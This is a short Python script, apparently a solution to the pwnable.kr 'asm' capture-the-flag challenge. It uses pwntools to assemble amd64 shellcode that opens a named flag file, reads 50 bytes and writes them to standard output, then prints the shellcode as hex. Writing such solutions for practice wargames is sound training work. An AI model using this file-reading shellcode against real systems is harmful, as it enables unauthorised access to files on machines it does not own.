from pwn import *

context(arch='amd64', os='linux')

shellcode = ""
shellcode += shellcraft.pushstr('this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong')
shellcode += shellcraft.open('rsp', 0)
shellcode += shellcraft.read('rax', 'rsp', 50)
shellcode += shellcraft.write(1, 'rsp', 50)


print asm(shellcode).encode('hex')
